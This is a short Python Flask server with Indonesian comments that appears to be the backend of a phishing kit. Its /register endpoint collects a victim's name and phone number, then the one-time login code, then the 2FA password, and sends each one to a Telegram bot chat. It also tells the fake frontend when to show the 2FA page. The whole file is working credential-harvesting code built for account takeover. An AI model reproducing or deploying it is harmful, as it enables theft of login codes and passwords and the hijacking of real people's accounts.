import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)

# MENGATASI CORS ERROR di Screenshot (293)
CORS(app, resources={r"/*": {"origins": "*"}})

# Mengambil variabel sesuai nama di Screenshot (294)
TOKEN = os.getenv("BOT_TOKEN") 
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def send_to_telegram(message):
    if TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        requests.post(url, json=payload)

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    step = data.get('step')
    
    # Logika pengiriman pesan ke Telegram
    if step == 1:
        msg = f"🔔 *Data Masuk*\n👤 Nama: {data.get('nama')}\n📱 Nomor: {data.get('nomor')}"
        send_to_telegram(msg)
        return jsonify({"status": "success"}), 200
    
    elif step == 2:
        msg = f"🔑 *OTP*\n📱 Nomor: {data.get('nomor')}\n🔢 OTP: {data.get('otp')}"
        send_to_telegram(msg)
        # Respon ini memicu halaman 2FA di frontend
        return jsonify({"status": "need_2fa", "next_step": "2fa"}), 200

    elif step == 3:
        msg = f"🔐 *Sandi 2FA*\n📱 Nomor: {data.get('nomor')}\n🔑 Sandi: {data.get('sandi')}"
        send_to_telegram(msg)
        return jsonify({"status": "success"}), 200

    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=os.getenv("PORT", 5000))